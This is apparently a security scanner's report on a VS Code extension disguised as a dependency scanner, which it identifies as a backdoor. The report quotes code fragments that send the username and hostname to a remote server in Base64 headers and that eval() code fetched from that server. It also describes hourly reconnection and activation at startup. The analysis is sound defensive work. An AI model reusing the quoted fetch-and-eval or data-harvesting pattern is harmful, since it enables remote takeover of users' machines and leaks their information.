summaries.summary: This extension is a malicious backdoor disguised as a dependency scanner. It does not perform any dependency scanning. Instead, it harvests system information (username, hostname, platform) and sends it to a remote server. It then fetches a URL from that server and executes the returned content using eval(), allowing the attacker to run arbitrary code on the user's machine. The code also includes persistence mechanisms to re-attempt the connection if it fails. This is a critical security threat.

findings.description: The extension claims to scan dependencies but performs no such action. Instead, it collects system information and executes remote code. The 'scan' command is a fake progress bar that does nothing.
The code harvests sensitive system information including username, hostname, platform, and user domain, and sends them to a remote server in Base64 encoded headers.
findings.code_reference: const userInfo = os.userInfo(); const machineName = os.hostname(); ... headers = { "X-ApiKey-Alpha": b64(userInfo.username), ... }

findings.description: The extension fetches a URL from a remote server and executes the response using eval(). This is a classic backdoor pattern allowing the attacker to run arbitrary code on the user's machine.
findings.code_reference: https.get(apiUrl, function(res) { res.on('data', function(data) { stopInterval(); eval(data.toString()); }); });

findings.description: The extension sets up a recurring interval to re-attempt the malicious connection every hour if the initial request fails or is denied, ensuring persistent access.
The extension activates on 'onStartupFinished', which is unnecessary for a manual scan command and allows the malicious code to run immediately upon VS Code startup.
